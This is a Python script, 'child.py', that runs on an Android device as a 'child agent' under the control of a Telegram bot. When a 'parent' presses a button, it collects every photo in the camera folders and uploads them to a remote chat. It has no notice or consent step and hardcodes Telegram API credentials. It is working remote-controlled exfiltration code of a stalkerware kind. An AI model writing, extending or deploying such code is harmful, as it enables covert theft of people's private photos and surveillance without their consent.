# child.py
import os
import json
import asyncio
from telethon import TelegramClient, events, Button

# ================= CONFIG =================
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]

# Camera photo folders
MEDIA_DIRS = [
    "/sdcard/DCIM/Camera",
    "/storage/emulated/0/DCIM/Camera"
]
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")

# ================= FUNCTIONS =================
def list_media():
    """List all media files in the camera directories."""
    files = []
    for base in MEDIA_DIRS:
        if not os.path.exists(base):
            continue
        for root, dirs, filenames in os.walk(base):
            for fn in filenames:
                if fn.lower().endswith(IMAGE_EXTS):
                    path = os.path.join(root, fn)
                    try:
                        mtime = os.path.getmtime(path)
                    except:
                        mtime = 0
                    files.append((mtime, path))
    files.sort(reverse=True)
    return [p for _, p in files]  # Return all files

async def send_gallery(client):
    files = list_media()
    if not files:
        await client.send_message(CHAT_ID, "No camera photos found.")
        return
    await client.send_message(CHAT_ID, f"Sending {len(files)} camera photos:")
    for fpath in files:
        if os.path.exists(fpath):
            try:
                await client.send_file(CHAT_ID, fpath)
            except Exception as e:
                print(f"Failed to send {fpath}: {e}")

# ================= MAIN =================
async def main():
    # Replace 12345 and '0123456789abcdef0123456789abcdef' with your api_id and api_hash from my.telegram.org
    api_id = 22071176
    api_hash = '7ed5401b625a0a4d3c45caf12c87f166'

    client = TelegramClient('child_session', api_id, api_hash)
    await client.start(bot_token=BOT_TOKEN)

    # Send device connected message with button
    await client.send_message(
        CHAT_ID,
        "Device connected ✅",
        buttons=[Button.inline("Get Gallery", b"get_gallery")]
    )

    @client.on(events.CallbackQuery)
    async def callback(event):
        if event.sender_id != CHAT_ID:
            return
        if event.data == b"get_gallery":
            await event.answer("Sending gallery...")
            await send_gallery(client)

    print("Child agent online — waiting for parent commands.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
